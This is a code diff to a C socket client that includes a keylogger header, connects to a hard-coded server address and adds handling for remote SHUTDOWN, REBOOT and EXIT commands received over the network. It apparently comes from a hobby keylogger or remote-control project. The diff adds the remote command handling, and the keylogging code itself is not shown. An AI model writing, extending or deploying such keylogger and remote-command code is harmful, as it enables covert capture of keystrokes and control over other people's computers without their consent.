@@ -8,6 +8,7 @@
 
 #include "../commonFiles/common.h"
 #include "keylog.h"
+#include "command.h"
 
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -19,6 +20,14 @@ int main() {
 	struct sockaddr_in serv_addr;
 	char buffer[1024] = { 0 };
 
+	box command;
+	inisialisasi(command);
+	addCommand("SHUTDOWN", SHUTDOWN, command);
+	addCommand("REBOOT", REBOOT, command);
+	addCommand("EXIT", EXIT, command);
+
+
+	printf("CONNECTED TO SERVER\n");
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
 		printf("WSAStartup failed\n");
 		return 1;
@@ -32,7 +41,7 @@ int main() {
 
 	serv_addr.sin_family = AF_INET;
 	serv_addr.sin_port = htons(PORT);
-	serv_addr.sin_addr.s_addr = inet_addr("10.10.195.94");
+	serv_addr.sin_addr.s_addr = inet_addr("192.168.0.104");
 
 	if (serv_addr.sin_addr.s_addr == INADDR_NONE) {
 		printf("Invalid address\n");
@@ -51,6 +60,7 @@ int main() {
 	clearBuffer(buffer, sizeof(buffer));
 
 
+	printf("CONNECTED TO SERVER\n");
 	bool keylogPass = false;
 	char charKey = '\0';
 	while (1) {
@@ -58,6 +68,7 @@ int main() {
 
 		int valread = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
 		if (valread <= 0) break;
+		proccess(buffer, command);
 
 		buffer[valread] = '\0';
 	}
